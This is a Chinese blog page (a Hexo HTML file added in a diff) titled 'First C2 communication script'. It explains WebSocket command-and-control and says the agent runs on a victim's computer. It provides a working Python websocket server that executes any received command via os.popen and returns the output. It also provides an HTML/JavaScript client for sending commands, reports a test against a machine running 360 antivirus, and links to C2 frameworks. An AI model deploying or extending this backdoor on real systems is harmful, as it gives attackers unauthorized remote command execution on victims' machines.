@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00前言这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理是基于websocket上的操作。 0x01正文原理： 1231.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互3.通过COM接口控制的浏览器进程（Intern">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一个c2通信脚本">
+<meta property="og:url" content="http://422926799.github.io/posts/d6f76024.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="0x00前言这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理是基于websocket上的操作。 0x01正文原理： 1231.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互3.通过COM接口控制的浏览器进程（Intern">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/14/FU1PvF.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/14/FU1Fu4.md.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.269Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第一个c2通信脚本">
+<meta name="twitter:description" content="0x00前言这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理是基于websocket上的操作。 0x01正文原理： 1231.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互3.通过COM接口控制的浏览器进程（Intern">
+<meta name="twitter:image" content="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>第一个c2通信脚本</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/9824134d.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/51e4fe35.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d6f76024.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d6f76024.html&text=第一个c2通信脚本"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d6f76024.html&is_video=false&description=第一个c2通信脚本"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第一个c2通信脚本&body=Check out this article: http://422926799.github.io/posts/d6f76024.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d6f76024.html&name=第一个c2通信脚本&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第一个c2通信脚本
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-12-14T10:13:48.000Z" itemprop="datePublished">2018-12-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理<br>是基于websocket上的操作。<br><img src="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30" alt="68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30"></p>
+<h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p><b>原理：</b></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令</span><br><span class="line">2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互</span><br><span class="line">3.通过COM接口控制的浏览器进程（Internet Explorer / Edge）通过WebScoket通道处理代理与C2服务器之间的所有通信</span><br></pre></td></tr></table></figure>
+<p><b>连接过程</b></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line">1.创建websocket然后调用js进行连接</span><br><span class="line">2.将创建好的websocket放入到受害者机子</span><br><span class="line">3.本地调用js连接然后执行命令由受害者端接收到进行命令执行在返回给攻击者</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">1.在肉鸡上创建websocket</span><br><span class="line">2.然后受害者连接，然后攻击者访问肉鸡执行命令</span><br><span class="line">3.受害者接收到执行命令，然后返回给肉鸡</span><br></pre></td></tr></table></figure>
+<p><b>代码</b><br>服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import websockets</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">async def hello(websocket,path):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            name = await websocket.recv() #接收客户端的信息</span><br><span class="line">            zx=os.popen(name) #执行命令</span><br><span class="line">            await websocket.send(zx.read()) #返回给客户端</span><br><span class="line">    except Exception as r:</span><br><span class="line">        print(&apos;[-] Error &#123;&#125;&apos;.format(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_server=websockets.serve(hello,&apos;&#123;&#125;&apos;.format(sys.argv[1]),sys.argv[2]) #创建websocket</span><br><span class="line">asyncio.get_event_loop().run_until_complete(start_server) #异步</span><br><span class="line">asyncio.get_event_loop().run_forever()</span><br></pre></td></tr></table></figure>
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Web sockets test&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;jquery-min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        var ws;</span><br><span class="line">        function ToggleConnectionClicked() &#123;          </span><br><span class="line">                try &#123;</span><br><span class="line">                    ws = new WebSocket(&quot;ws://IP:PORT&quot;);//连接服务器 （连接websocket服务器）</span><br><span class="line">                    ws.onopen = function(event)&#123;alert(&quot;已经与服务器建立了连接\r\n当前连接状 （连接成功后触发的事件）态：&quot;+this.readyState);&#125;;</span><br><span class="line">                    ws.onmessage = function(event)&#123;alert(&quot;接收到服务器发送的数据：\r\n&quot;+event.data);&#125;; （接收到数据触发的事件）</span><br><span class="line">                    ws.onclose = function(event)&#123;alert(&quot;已经与服务器断开连接\r\n当前连接状态：&quot;+this.readyState);&#125;;  //异常触发的事件</span><br><span class="line">                    ws.onerror = function(event)&#123;alert(&quot;WebSocket异常！&quot;);&#125;;</span><br><span class="line">                &#125; catch (ex) &#123;</span><br><span class="line">                    alert(ex.message);      </span><br><span class="line">                &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        function SendData() &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                var content = document.getElementById(&quot;content&quot;).value;</span><br><span class="line">                if(content)&#123;</span><br><span class="line">                    ws.send(content);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;catch(ex)&#123;</span><br><span class="line">                alert(ex.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        function seestate()&#123;</span><br><span class="line">            alert(ws.readyState);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;ToggleConnectionClicked();&apos;&gt;连接服务器&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">   &lt;textarea id=&quot;content&quot; &gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;SendData();&apos;&gt;发送我的名字：beston&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;seestate();&apos;&gt;查看状态&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><b>测试</b><br><img src="https://s1.ax1x.com/2018/12/14/FU1PvF.jpg" alt="FU1PvF.jpg"></p>
+<p><img src="https://s1.ax1x.com/2018/12/14/FU1Fu4.md.png" alt="FU1Fu4.md.png"></p>
+<p>在安有360的机子上进行测试：<br>视频:<a href="https://v.youku.com/v_show/id_XMzk2NDI2MjI0MA==.html?spm=a2hzp.8253869.0.0" target="_blank" rel="noopener">c2通信实现—其他—视频高清在线观看-优酷</a></p>
+<p><b>一些c2的项目</b><br><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">GitHub - nettitude/PoshC2: Powershell C2 Server and Implants</a><br><a href="https://github.com/Arno0x/WSC2" target="_blank" rel="noopener">GitHub - Arno0x/WSC2: A WebSocket C2 Tool</a><br><b>参考文章</b><br><a href="https://arno0x0x.wordpress.com/2017/11/10/using-websockets-and-ie-edge-for-c2-communications/" target="_blank" rel="noopener">Using WebSockets and IE/Edge for C2 communications – arno0x0x</a></p>
+<p>github地址：<a href="https://github.com/422926799/python/tree/master/c2%E9%A1%B9%E7%9B%AE" target="_blank" rel="noopener">python/c2项目 at master · 422926799/python · GitHub</a></p>
+<p><b>后续开发的一些建议</b></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.实现以上说的方法</span><br><span class="line">2.加密传输</span><br></pre></td></tr></table></figure>
+<p>转载请注明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d6f76024.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d6f76024.html&text=第一个c2通信脚本"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d6f76024.html&is_video=false&description=第一个c2通信脚本"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第一个c2通信脚本&body=Check out this article: http://422926799.github.io/posts/d6f76024.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d6f76024.html&title=第一个c2通信脚本"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d6f76024.html&name=第一个c2通信脚本&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
